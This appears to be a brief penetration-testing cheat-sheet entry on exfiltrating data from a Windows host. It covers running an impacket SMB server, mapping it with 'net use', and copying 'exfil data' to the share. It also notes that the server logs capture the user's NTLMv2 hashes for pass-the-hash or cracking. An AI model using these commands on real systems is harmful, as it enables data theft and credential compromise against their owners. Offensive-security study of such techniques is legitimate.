
Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
 can be usefull to PTH, or crack passwords

Since Windows 10, you can't do anonymous smb server anymore
```shell
sudo impacket-smbserver share_name -smb2support ./path/to/share -username "home" -password "home"

```
```powershell
net use Z: \\192.168.30.130\SDFR /user:home home
```
```powershell
net use Z: /delete /y
```

you can move about the cabin.
```powershell
cd Z:\
copy .\some\important\exfil\data Z:\
```
